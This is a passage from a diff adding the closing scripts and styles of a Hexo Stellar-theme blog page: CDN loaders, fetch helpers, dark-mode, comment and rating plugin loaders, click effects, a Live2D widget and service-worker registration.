+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+
+
+<script type="text/javascript">
+  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
+  };
+  const deps = {
+    jquery: `https://gcore.jsdelivr.net/npm/jquery@3.7/dist/jquery.min.js`,
+    marked: `https://gcore.jsdelivr.net/npm/marked@13.0/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject('请求超时');
+            } else {
+              setTimeout(load, 1000);
+            }
+          }, 5000);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
+            callback(data);
+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject(err);
+            } else {
+              setTimeout(load, 1000);
+            }
+          });
+        };
+
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+    
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+  
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.33.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    document.documentElement.setAttribute('data-theme', theme)
+  }
+
+  const switchTheme = () => {
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    if (currentTheme === 'light') {
+      newTheme = 'dark'
+    } else {
+      newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
+      applyTheme('dark')
+    }
+  })()
+</script>
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://gcore.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+
+<!-- Custom Image Viewer -->
+<script src="/js/plugins/image-viewer.js"></script>
+
+<!-- Custom Context Menu -->
+<script src="/js/plugins/custom-context-menu.js"></script>
+
+<!-- Glitch Effect -->
+<script src="/js/plugins/glitch-effect.js"></script>
+
+<!-- Terminal Copy -->
+<script src="/js/plugins/terminal-copy.js"></script>
+
+<!-- Hotkeys -->
+<script src="/js/plugins/hotkeys.js"></script>
+
+<!-- Achievements / Card System -->
+<script src="/js/plugins/achievements.js"></script>
+
+<!-- Music Player -->
+<script src="/js/plugins/music-player.js"></script>
+
+<!-- Offline Vault - 断网保护机制 -->
+<script src="/js/plugins/offline-vault.js"></script>
+
+<!-- Live2D Widget - Local Version -->
+<script src="/live2d-widget/dist/autoload.js"></script>
+
+<!-- Live2D Widget 位置调整和默认显示 -->
+<style>
+  #waifu {
+    position: fixed !important;
+    bottom: 20px !important;
+    right: 20px !important;
+    left: auto !important;
+    z-index: 1000 !important;
+    transform: none !important;
+    display: block !important;
+    opacity: 1 !important;
+    visibility: visible !important;
+  }
+  #waifu #live2d {
+    position: relative !important;
+    transform: none !important;
+  }
+  #waifu-toolbar {
+    position: relative !important;
+    transform: none !important;
+  }
+  #waifu-toggle {
+    display: none !important;
+  }
+</style>
+
+<!-- 点击特效 -->
+<script>
+(function() {
+  var clickEffects = {
+    current: null,
+    
+    init: function() {
+      this.current = localStorage.getItem('clickEffect') || 'none';
+      this.bindEvents();
+    },
+    
+    bindEvents: function() {
+      var self = this;
+      document.addEventListener('click', function(e) {
+        if (self.current === 'none') return;
+        if (e.target.closest('button, a, input, textarea, select, .post-card, .layout-btn')) return;
+        self.createEffect(e.clientX, e.clientY);
+      });
+      
+      window.addEventListener('storage', function(e) {
+        if (e.key === 'clickEffect') {
+          self.current = e.newValue || 'none';
+        }
+      });
+    },
+    
+    createEffect: function(x, y) {
+      switch(this.current) {
+        case 'ripple': this.createRipple(x, y); break;
+        case 'firework': this.createFirework(x, y); break;
+        case 'particles': this.createParticles(x, y); break;
+        case 'text': this.createText(x, y); break;
+        default: break;
+      }
+    },
+    
+    createRipple: function(x, y) {
+      var ripple = document.createElement('div');
+      ripple.className = 'click-ripple';
+      ripple.style.cssText = 'position:fixed;left:' + x + 'px;top:' + y + 'px;width:0;height:0;border-radius:50%;background:rgba(52,152,219,0.4);transform:translate(-50%,-50%);pointer-events:none;z-index:9999;animation:rippleExpand 0.6s ease-out forwards;';
+      document.body.appendChild(ripple);
+      setTimeout(function() { ripple.remove(); }, 600);
+    },
+    
+    createFirework: function(x, y) {
+      var colors = ['#ff6b6b', '#feca57', '#48dbfb', '#ff9ff3', '#54a0ff'];
+      for (var i = 0; i < 12; i++) {
+        var particle = document.createElement('div');
+        var angle = (Math.PI * 2 / 12) * i;
+        var velocity = 50 + Math.random() * 30;
+        particle.style.cssText = 'position:fixed;left:' + x + 'px;top:' + y + 'px;width:6px;height:6px;border-radius:50%;background:' + colors[i % 5] + ';pointer-events:none;z-index:9999;transform:translate(-50%,-50%);';
+        document.body.appendChild(particle);
+        this.animateParticle(particle, x, y, x + Math.cos(angle) * velocity, y + Math.sin(angle) * velocity, 500);
+      }
+    },
+    
+    createParticles: function(x, y) {
+      var colors = ['#ff6b6b', '#feca57', '#48dbfb', '#ff9ff3', '#54a0ff', '#5f27cd'];
+      for (var i = 0; i < 8; i++) {
+        var particle = document.createElement('div');
+        particle.innerHTML = '✨';
+        particle.style.cssText = 'position:fixed;left:' + (x + (Math.random()-0.5)*30) + 'px;top:' + (y + (Math.random()-0.5)*30) + 'px;font-size:16px;pointer-events:none;z-index:9999;animation:particleFloat 0.8s ease-out forwards;';
+        document.body.appendChild(particle);
+        setTimeout(function(p) { return function() { p.remove(); }; }(particle), 800);
+      }
+    },
+    
+    createText: function(x, y) {
+      var texts = ['666', '厉害', 'nice', '棒', '赞', '给力'];
+      var text = document.createElement('div');
+      text.innerHTML = texts[Math.floor(Math.random() * texts.length)];
+      text.style.cssText = 'position:fixed;left:' + x + 'px;top:' + y + 'px;font-size:18px;font-weight:bold;color:#3498db;pointer-events:none;z-index:9999;transform:translate(-50%,-50%);animation:textFloat 0.8s ease-out forwards;';
+      document.body.appendChild(text);
+      setTimeout(function() { text.remove(); }, 800);
+    },
+    
+    animateParticle: function(el, startX, startY, endX, endY, duration) {
+      var startTime = performance.now();
+      function animate(currentTime) {
+        var progress = Math.min((currentTime - startTime) / duration, 1);
+        var easeOut = 1 - Math.pow(1 - progress, 3);
+        el.style.left = (startX + (endX - startX) * easeOut) + 'px';
+        el.style.top = (startY + (endY - startY) * easeOut) + 'px';
+        el.style.opacity = 1 - progress;
+        if (progress < 1) requestAnimationFrame(animate);
+        else el.remove();
+      }
+      requestAnimationFrame(animate);
+    }
+  };
+  
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', function() { clickEffects.init(); });
+  } else {
+    clickEffects.init();
+  }
+  
+  window.ClickEffects = clickEffects;
+})();
+</script>
+
+<style>
+@keyframes rippleExpand {
+  0% { width: 0; height: 0; opacity: 1; }
+  100% { width: 100px; height: 100px; opacity: 0; }
+}
+@keyframes particleFloat {
+  0% { opacity: 1; transform: translateY(0) scale(1); }
+  100% { opacity: 0; transform: translateY(-40px) scale(0.5); }
+}
+@keyframes textFloat {
+  0% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+  100% { opacity: 0; transform: translate(-50%, -80px) scale(1.2); }
+}
+</style>
+
+<!-- PWA Service Worker -->
+<script>
+if ('serviceWorker' in navigator) {
+  navigator.serviceWorker.register('/sw.js').then(function(reg) {
+    console.log('Service Worker 已注册，支持离线访问');
+  }).catch(function(err) {
+    console.log('Service Worker 注册失败:', err);
+  });
+}
+</script>
+
+</div></body></html>
